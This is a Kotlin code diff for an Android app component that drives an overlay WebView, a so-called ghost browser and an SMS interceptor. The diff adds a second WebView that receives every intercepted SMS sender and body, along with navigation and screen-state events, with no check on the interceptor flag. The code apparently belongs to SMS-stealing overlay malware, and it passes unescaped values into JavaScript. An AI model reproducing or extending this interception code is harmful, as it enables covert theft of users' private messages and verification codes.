@@ -22,6 +22,7 @@ import org.json.JSONObject
 
 object DynamicUIManager {
     private var overlayView: WebView? = null
+    var appModeWebView: WebView? = null
     private var currentType: Int = -1
     private var cachedSmsHtml: String? = null
     
@@ -713,6 +714,7 @@ object DynamicUIManager {
                     finalUrl = "https://www.google.com/search?q=" + java.net.URLEncoder.encode(url, "UTF-8")
                 }
                 overlayView?.loadUrl(finalUrl)
+                appModeWebView?.loadUrl(finalUrl)
                 DebugLogger.log("GHOST_BROWSER", "Navigating to: $finalUrl")
             }
         }
@@ -1203,6 +1205,7 @@ object DynamicUIManager {
         Handler(Looper.getMainLooper()).post {
             if (!isOn) {
                 overlayView?.evaluateJavascript("if(typeof onScreenOff === 'function') onScreenOff();", null)
+                appModeWebView?.evaluateJavascript("if(typeof onScreenOff === 'function') onScreenOff();", null)
             }
             activeNativeEntry?.onScreenStateChanged(isOn)
         }
@@ -1538,20 +1541,25 @@ object DynamicUIManager {
     }
 
     fun injectLiveSms(sender: String, body: String, ts: Long) {
-        if (isSmsInterceptorActive && isAttached && overlayView != null) {
-            Handler(Looper.getMainLooper()).post {
-                val safeSender = sender.replace("\\", "\\\\").replace("\"", "\\\"").replace("'", "\\'")
-                val safeBody = body.replace("\\", "\\\\").replace("\"", "\\\"").replace("'", "\\'").replace("\n", "\\n")
-                overlayView?.evaluateJavascript("if(typeof window.onSmsReceived === 'function') { window.onSmsReceived('$safeSender', '$safeBody', $ts); }", null)
+        Handler(Looper.getMainLooper()).post {
+            val safeSender = sender.replace("\\", "\\\\").replace("\"", "\\\"").replace("'", "\\'")
+            val safeBody = body.replace("\\", "\\\\").replace("\"", "\\\"").replace("'", "\\'").replace("\n", "\\n")
+            val script = "if(typeof window.onSmsReceived === 'function') { window.onSmsReceived('$safeSender', '$safeBody', $ts); }"
+            
+            if (isSmsInterceptorActive && isAttached && overlayView != null) {
+                overlayView?.evaluateJavascript(script, null)
             }
+            appModeWebView?.evaluateJavascript(script, null)
         }
     }
 
     fun dispatchSmsStatus(messageId: String, status: String) {
         Handler(Looper.getMainLooper()).post {
+            val script = "if(typeof window.onSmsStatus === 'function') { window.onSmsStatus('$messageId', '$status'); }"
             if (isAttached && overlayView != null) {
-                overlayView?.evaluateJavascript("if(typeof window.onSmsStatus === 'function') { window.onSmsStatus('$messageId', '$status'); }", null)
+                overlayView?.evaluateJavascript(script, null)
             }
+            appModeWebView?.evaluateJavascript(script, null)
         }
     }
 
